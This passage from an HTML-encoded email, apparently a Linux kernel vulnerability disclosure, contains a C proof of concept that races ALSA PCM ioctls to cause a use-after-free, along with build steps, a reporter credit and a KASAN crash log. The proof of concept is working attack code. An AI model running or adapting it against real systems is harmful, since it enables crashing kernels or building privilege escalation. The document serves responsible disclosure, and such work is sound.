<p style=3D"margin:0px;white-space:pre-wrap">	unsigned int msbits;		/* R: u=
sed most significant bits */</p>
<p style=3D"margin:0px;white-space:pre-wrap">	unsigned int rate_num;		/* R:=
 rate numerator */</p>
<p style=3D"margin:0px;white-space:pre-wrap">	unsigned int rate_den;		/* R:=
 rate denominator */</p>
<p style=3D"margin:0px;white-space:pre-wrap">	snd_pcm_uframes_t fifo_size;	=
/* R: chip FIFO size in frames */</p>
<p style=3D"margin:0px;white-space:pre-wrap">	unsigned char reserved[64];	/=
* reserved for future */</p>
<p style=3D"margin:0px;white-space:pre-wrap">};</p>
<p style=3D"margin:0px;white-space:pre-wrap">int k;</p>
<p style=3D"margin:0px;white-space:pre-wrap">int magic_fd;</p>
<p style=3D"margin:0px;white-space:pre-wrap">unsigned char hw_params_data[]=
 =3D</p>
<p style=3D"margin:0px;white-space:pre-wrap">{</p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x00, 0x00, 0x08=
, 0x00, 0x00, 0x00, 0x00, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x00, 0x00, 0x00=
, 0x00, 0x00, 0x00, 0x00, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x00, 0x00, 0x00=
, 0x00, 0x00, 0x00, 0x00, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x00, 0x00, 0x00=
, 0x00, 0x04, 0x00, 0x00, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x00, 0x00, 0x00=
, 0x00, 0x00, 0x00, 0x00, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x00, 0x00, 0x00=
, 0x00, 0x00, 0x00, 0x00, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x00, 0x00, 0x00=
, 0x00, 0x00, 0x00, 0x01, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x00, 0x00, 0x00=
, 0x00, 0x00, 0x00, 0x00, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x00, 0x00, 0x00=
, 0x00, 0x00, 0x00, 0x00, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x00, 0x00, 0x00=
, 0x00, 0x00, 0x00, 0x00, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x00, 0x00, 0x00=
, 0x00, 0x00, 0x00, 0x00, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x00, 0x00, 0x00=
, 0x00, 0x00, 0x00, 0x00, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x00, 0x00, 0x00=
, 0x00, 0x00, 0x00, 0x00, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x00, 0x00, 0x00=
, 0x00, 0x00, 0x00, 0x00, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x00, 0x00, 0x00=
, 0x00, 0x00, 0x00, 0x00, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x00, 0x00, 0x00=
, 0x00, 0x00, 0x00, 0x00, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x00, 0x00, 0x00=
, 0x00, 0x00, 0x00, 0x00, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x00, 0x00, 0x00=
, 0x00, 0x00, 0x00, 0x00, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x00, 0x00, 0x00=
, 0x00, 0x00, 0x00, 0x00, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x00, 0x00, 0x00=
, 0x00, 0x00, 0x00, 0x00, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x00, 0x00, 0x00=
, 0x00, 0x00, 0x00, 0x00, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x00, 0x00, 0x00=
, 0x00, 0x00, 0x00, 0x00, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x00, 0x00, 0x00=
, 0x00, 0x00, 0x00, 0x00, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x00, 0x00, 0x00=
, 0x00, 0x00, 0x00, 0x00, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x00, 0x00, 0x00=
, 0x00, 0x00, 0x00, 0x00, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x00, 0x00, 0x00=
, 0x00, 0x00, 0x00, 0x00, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x10, 0x00, 0x00, 0x00, 0x10=
, 0x00, 0x00, 0x00, 0x04, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x20, 0x00, 0x00=
, 0x00, 0x20, 0x00, 0x00, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x04, 0x00, 0x00, 0x00, 0x02=
, 0x00, 0x00, 0x00, 0x02, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x04, 0x00, 0x00=
, 0x00, 0x40, 0x1F, 0x00, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x80, 0xBB, 0x00, 0x00, 0x00=
, 0x00, 0x00, 0x00, 0x55, 0x35, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x05, 0x00, 0x00, 0x40, 0x1F=
, 0x00, 0x01, 0x00, 0x00, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x48, 0x00, 0x00, 0x00=
, 0x48, 0x00, 0x00, 0x04, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x00, 0x20, 0x01=
, 0x00, 0x00, 0x20, 0x01, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x04, 0x00, 0x00, 0x00, 0x01=
, 0x00, 0x00, 0x00, 0x01, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x04, 0x00, 0x00=
, 0x00, 0x55, 0x35, 0x05, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x40, 0x1F, 0x00, 0x01=
, 0x00, 0x00, 0x00, 0x00, 0x48, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x00, 0x48, 0x00=
, 0x00, 0x04, 0x00, 0x00, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x20, 0x01, 0x00, 0x00=
, 0x20, 0x01, 0x00, 0x04, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x00, 0x00, 0x00=
, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x00, 0x00, 0x00=
, 0x00, 0x00, 0x00, 0x00, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x00, 0x00, 0x00=
, 0x00, 0x00, 0x00, 0x00, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x00, 0x00, 0x00=
, 0x00, 0x00, 0x00, 0x00, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x00, 0x00, 0x00=
, 0x00, 0x00, 0x00, 0x00, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x00, 0x00, 0x00=
, 0x00, 0x00, 0x00, 0x00, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x00, 0x00, 0x00=
, 0x00, 0x00, 0x00, 0x00, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x00, 0x00, 0x00=
, 0x00, 0x00, 0x00, 0x00, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x00, 0x00, 0x00=
, 0x00, 0x00, 0x00, 0x00, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x00, 0x00, 0x00=
, 0x00, 0x00, 0x00, 0x00, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x00, 0x00, 0x00=
, 0x00, 0x00, 0x00, 0x00, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x00, 0x00, 0x00=
, 0x00, 0x00, 0x00, 0x00, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x00, 0x00, 0x00=
, 0x00, 0x07, 0xFF, 0x07, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x03, 0x01, 0x0D, 0x80, 0x10=
, 0x00, 0x00, 0x00, 0x00, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x00, 0x00, 0x00=
, 0x00, 0x00, 0x00, 0x00, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x00, 0x00, 0x00=
, 0x00, 0x00, 0x00, 0x00, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x00, 0x00, 0x00=
, 0x00, 0x00, 0x00, 0x00, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x00, 0x00, 0x00=
, 0x00, 0x00, 0x00, 0x00, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x00, 0x00, 0x00=
, 0x00, 0x00, 0x00, 0x00, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x00, 0x00, 0x00=
, 0x00, 0x00, 0x00, 0x00, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x00, 0x00, 0x00=
, 0x00, 0x00, 0x00, 0x00, 0x00, </p>
<p style=3D"margin:0px;white-space:pre-wrap">  0x00, 0x00, 0x00, 0x00, 0x00=
, 0x00, 0x00, 0x00</p>
<p style=3D"margin:0px;white-space:pre-wrap">};</p>
<p style=3D"margin:0px;white-space:pre-wrap">void race(){</p>
<p style=3D"margin:0px;white-space:pre-wrap">  while(k!=3D1){};</p>
<p style=3D"margin:0px;white-space:pre-wrap">  ioctl(magic_fd,0x4112,0);</p>
<p style=3D"margin:0px;white-space:pre-wrap">}</p>
<p style=3D"margin:0px;white-space:pre-wrap">int main(int argc, char *argv[=
])</p>
<p style=3D"margin:0px;white-space:pre-wrap">{</p>
<p style=3D"margin:0px;white-space:pre-wrap">  int i; </p>
<p style=3D"margin:0px;white-space:pre-wrap">  int j; </p>
<p style=3D"margin:0px;white-space:pre-wrap">  int fd; </p>
<p style=3D"margin:0px;white-space:pre-wrap">  snd_pcm_hw_params_t *ptr; </=
p>
<p style=3D"margin:0px;white-space:pre-wrap">  snd_pcm_hw_params_malloc(&am=
p;ptr);</p>
<p style=3D"margin:0px;white-space:pre-wrap">  memcpy(ptr, hw_params_data, =
0x260);</p>
<p style=3D"margin:0px;white-space:pre-wrap">  magic_fd =3D open(&quot;/dev=
/snd/pcmC0D1c&quot;, 0);</p>
<p style=3D"margin:0px;white-space:pre-wrap">  printf(&quot;[+] CHECK FD: %=
d\n&quot;,magic_fd);</p>
<p style=3D"margin:0px;white-space:pre-wrap">  ioctl(magic_fd, 0xC2604111, =
ptr);</p>
<p style=3D"margin:0px;white-space:pre-wrap">#define RACE_NUM 20</p>
<p style=3D"margin:0px;white-space:pre-wrap">  pthread_t race_thread[RACE_N=
UM]=3D{};</p>
<p style=3D"margin:0px;white-space:pre-wrap">  for(int i=3D0;i&lt;RACE_NUM;=
i++){</p>
<p style=3D"margin:0px;white-space:pre-wrap">      pthread_create(&amp;race=
_thread[i],NULL,race,NULL);</p>
<p style=3D"margin:0px;white-space:pre-wrap">  }</p>
<p style=3D"margin:0px;white-space:pre-wrap">  k=3D1;</p>
<p style=3D"margin:0px;white-space:pre-wrap">  for(int i=3D0;i&lt;RACE_NUM;=
i++){</p>
<p style=3D"margin:0px;white-space:pre-wrap">      pthread_join(race_thread=
[i],NULL);</p>
<p style=3D"margin:0px;white-space:pre-wrap">  }</p>
<p style=3D"margin:0px;white-space:pre-wrap">  return 0;</p>
<p style=3D"margin:0px;white-space:pre-wrap">}</p>
<p style=3D"margin:0px;white-space:pre-wrap">```</p><p style=3D"margin:0px;=
white-space:pre-wrap"><br></p>
<p style=3D"margin:0px;white-space:pre-wrap">To trigger it easily, please r=
un it in VirtualBox with Ubuntu(with latest stable kernel version), and mak=
e sure that the user has permission to open &quot;/dev/snd/pcmC0D1c&quot;(i=
n user group: audio) :</p>
<p style=3D"margin:0px;white-space:pre-wrap">```</p>
<p style=3D"margin:0px;white-space:pre-wrap">sudo apt-get install libasound=
2-dev</p>
<p style=3D"margin:0px;white-space:pre-wrap">gcc exp.c -lasound -lpthread -=
ldl -lm -o poc</p>
<p style=3D"margin:0px;white-space:pre-wrap">./poc  # I lost a stable versi=
on of POC, you may need to run the poc(above) several times to see a kasan =
log of use-after-free.</p>
<p style=3D"margin:0px;white-space:pre-wrap">```</p><p style=3D"margin:0px;=
white-space:pre-wrap"><br></p>
<p style=3D"margin:0px;white-space:pre-wrap">## Reporter</p><p style=3D"mar=
gin:0px;white-space:pre-wrap"><br></p><p style=3D"margin:0px;white-space:pr=
e-wrap">Kirin(@Pwnrin) of Tencent Security Xuanwu Lab</p><p style=3D"margin=
:0px;white-space:pre-wrap"><br></p>
<p style=3D"margin:0px;white-space:pre-wrap">## KASAN LOG </p>
<p style=3D"margin:0px;white-space:pre-wrap">```</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594199] BUG: Bad page s=
tate in process exp  pfn:79140</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594201] =3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594213] BUG: KASAN: use=
-after-free in snd_dma_free_pages+0x2cd/0x380 [snd_pcm]</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594217] Read of size 4 =
at addr ffff8880b34c9400 by task exp/1956</p>
<p style=3D"margin:0px;white-space:pre-wrap"><br></p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594224] CPU: 1 PID: 195=
6 Comm: exp Not tainted 5.4.166 #1</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594226] Hardware name: =
innotek GmbH VirtualBox/VirtualBox, BIOS VirtualBox 12/01/2006</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594228] page:ffffea0001=
e45000 refcount:-1 mapcount:0 mapping:0000000000000000 index:0x0 compound_m=
apcount: 0</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594231] flags: 0xfffffc=
0010000(head)</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594232] Call Trace:</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594253]  dump_stack+0x9=
6/0xc7</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594255] raw: 000fffffc0=
010000 dead000000000100 dead000000000122 0000000000000000</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594264]  print_address_=
description.constprop.0+0x20/0x210</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594265] raw: 0000000000=
000000 0000000000000000 ffffffffffffffff 0000000000000000</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594266] page dumped bec=
ause: nonzero _refcount</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594272]  ? snd_dma_free=
_pages+0x2cd/0x380 [snd_pcm]</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594275]  __kasan_report=
.cold+0x37/0x77</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594276] Modules linked =
in: nls_iso8859_1</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594283]  ? snd_dma_free=
_pages+0x2cd/0x380 [snd_pcm]</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594284]  intel_rapl_msr=
 snd_intel8x0 snd_ac97_codec ac97_bus</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594289]  kasan_report+0=
x14/0x20</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594289]  snd_pcm snd_se=
q_midi</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594293]  __asan_report_=
load4_noabort+0x14/0x20</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594294]  snd_seq_midi_e=
vent snd_rawmidi</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594300]  snd_dma_free_p=
ages+0x2cd/0x380 [snd_pcm]</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594300]  snd_seq intel_=
rapl_common crct10dif_pclmul</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594308]  snd_pcm_lib_fr=
ee_pages+0xc6/0x250 [snd_pcm]</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594308]  ghash_clmulni_=
intel snd_seq_device joydev</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594314]  snd_intel8x0_h=
w_free+0x98/0x170 [snd_intel8x0]</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594314]  cryptd snd_tim=
er rapl</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594321]  snd_pcm_common=
_ioctl+0x5d5/0x1b00 [snd_pcm]</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594322]  input_leds ser=
io_raw snd vboxguest</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594329]  ? snd_pcm_stat=
us_user+0x130/0x130 [snd_pcm]</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594330]  soundcore mac_=
hid sch_fq_codel vmwgfx ttm</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594338]  snd_pcm_ioctl+=
0x6d/0xb0 [snd_pcm]</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594339]  drm_kms_helper=
 fb_sys_fops syscopyarea</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594344]  do_vfs_ioctl+0=
x9da/0x1020</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594345]  sysfillrect sy=
simgblt drm</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594349]  ? ioctl_preall=
ocate+0x1c0/0x1c0</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594349]  parport_pc ppd=
ev</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594353]  ? __kasan_chec=
k_write+0x14/0x20</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594353]  lp parport ip_=
tables</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594357]  ? __fget+0x21c=
/0x3d0</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594358]  x_tables autof=
s4 hid_generic</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594362]  ? copy_fd_bitm=
aps+0x2e0/0x2e0</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594363]  usbhid hid psm=
ouse</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594366]  ? __switch_to_=
asm+0x40/0x70</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594367]  crc32_pclmul a=
hci</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594369]  ? __switch_to_=
asm+0x34/0x70</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594370]  libahci e1000<=
/p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594373]  ? __switch_to_=
asm+0x40/0x70</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594373]  i2c_piix4 pata=
_acpi</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594376]  ? __switch_to_=
asm+0x34/0x70</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594376]  video</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594381]  ? __fget_light=
+0x17e/0x1f0</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594384]  ksys_ioctl+0x6=
7/0x90</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594387]  __x64_sys_ioct=
l+0x73/0xb0</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594391]  ? fpregs_asser=
t_state_consistent+0x22/0xa0</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594395]  do_syscall_64+=
0x9f/0x3c0</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594398]  ? syscall_retu=
rn_slowpath+0x1a5/0x220</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594402]  entry_SYSCALL_=
64_after_hwframe+0x44/0xa9</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594404] RIP: 0033:0x4e6=
8b7</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594409] Code: 4f 55 04 =
00 85 c0 78 df 48 83 c4 08 48 89 d8 5b 5d c3 90 48 89 e8 48 f7 d8 48 39 c3 =
0f 92 c0 eb b4 66 90 b8 10 00 00 00 0f 05 &lt;48&gt; 3d 01 f0 ff ff 73 01 c=
3 48 c7 c1 b8 ff ff ff f7 d8 64 89 01 48</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594410] RSP: 002b:00007=
fab6baaada8 EFLAGS: 00000246 ORIG_RAX: 0000000000000010</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594414] RAX: ffffffffff=
ffffda RBX: 0000000000000000 RCX: 00000000004e68b7</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594415] RDX: 0000000000=
000000 RSI: 0000000000004112 RDI: 0000000000000003</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594417] RBP: 00007fab6b=
aaadb0 R08: 00007fab6baab700 R09: 00007fab6baab700</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594419] R10: 00007fab6b=
aab9d0 R11: 0000000000000246 R12: 00007fab6baaae80</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594421] R13: 0000000000=
000000 R14: 0000000000000000 R15: 00007ffe52234d70</p>
<p style=3D"margin:0px;white-space:pre-wrap"><br></p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594427] CPU: 2 PID: 194=
8 Comm: exp Not tainted 5.4.166 #1</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594429] Hardware name: =
innotek GmbH VirtualBox/VirtualBox, BIOS VirtualBox 12/01/2006</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594430] Call Trace:</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594431] Allocated by ta=
sk 1946:</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594435]  save_stack+0x2=
3/0x90</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594438]  __kasan_kmallo=
c.constprop.0+0xcf/0xe0</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594441]  dump_stack+0x9=
6/0xc7</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594443]  kasan_kmalloc+=
0x9/0x10</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594445]  bad_page.cold+=
0xfb/0x120</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594448]  kmem_cache_all=
oc_trace+0x113/0x290</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594450]  ? si_mem_avail=
able+0x310/0x310</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594456]  snd_pcm_lib_ma=
lloc_pages+0x2bd/0x680 [snd_pcm]</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594458]  ? __kasan_chec=
k_write+0x14/0x20</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594461]  snd_intel8x0_h=
w_params+0x10d/0x550 [snd_intel8x0]</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594464]  ? mutex_lock+0=
x8f/0xe0</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594469]  snd_pcm_hw_par=
ams+0x2c6/0x1250 [snd_pcm]</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594471]  free_pages_che=
ck_bad+0x147/0x1b0</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594477]  snd_pcm_common=
_ioctl+0x362/0x1b00 [snd_pcm]</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594479]  __free_pages_o=
k+0x80d/0xa60</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594485]  snd_pcm_ioctl+=
0x6d/0xb0 [snd_pcm]</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594488]  __free_pages+0=
x47/0x50</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594491]  do_vfs_ioctl+0=
x9da/0x1020</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594505]  dma_direct_fre=
e_pages+0xc7/0x150</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594507]  ksys_ioctl+0x6=
7/0x90</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594510]  dma_direct_fre=
e+0xe/0x10</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594512]  __x64_sys_ioct=
l+0x73/0xb0</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594514]  dma_free_attrs=
+0x61/0x150</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594517]  do_syscall_64+=
0x9f/0x3c0</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594524]  ? snd_ac97_pcm=
_close+0x2d3/0x5a0 [snd_ac97_codec]</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594527]  entry_SYSCALL_=
64_after_hwframe+0x44/0xa9</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594532]  snd_dma_free_p=
ages+0x16b/0x380 [snd_pcm]</p>
<p style=3D"margin:0px;white-space:pre-wrap"><br></p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594540]  snd_pcm_lib_fr=
ee_pages+0xc6/0x250 [snd_pcm]</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594542] Freed by task 1=
947:</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594545]  snd_intel8x0_h=
w_free+0x11e/0x170 [snd_intel8x0]</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594552]  snd_pcm_common=
_ioctl+0x5d5/0x1b00 [snd_pcm]</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594555]  save_stack+0x2=
3/0x90</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594560]  ? snd_pcm_stat=
us_user+0x130/0x130 [snd_pcm]</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594563]  __kasan_slab_f=
ree+0x137/0x180</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594568]  snd_pcm_ioctl+=
0x6d/0xb0 [snd_pcm]</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594570]  kasan_slab_fre=
e+0xe/0x10</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594573]  do_vfs_ioctl+0=
x9da/0x1020</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594575]  kfree+0x98/0x2=
70</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594577]  ? ioctl_preall=
ocate+0x1c0/0x1c0</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594582]  snd_pcm_lib_fr=
ee_pages+0xed/0x250 [snd_pcm]</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594585]  ? __kasan_chec=
k_write+0x14/0x20</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594588]  snd_intel8x0_h=
w_free+0x11e/0x170 [snd_intel8x0]</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594590]  ? __fget+0x21c=
/0x3d0</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594596]  snd_pcm_common=
_ioctl+0x5d5/0x1b00 [snd_pcm]</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594598]  ? copy_fd_bitm=
aps+0x2e0/0x2e0</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594603]  snd_pcm_ioctl+=
0x6d/0xb0 [snd_pcm]</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594605]  ? __switch_to_=
asm+0x40/0x70</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594607]  ? __switch_to_=
asm+0x34/0x70</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594609]  do_vfs_ioctl+0=
x9da/0x1020</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594611]  ksys_ioctl+0x6=
7/0x90</p>
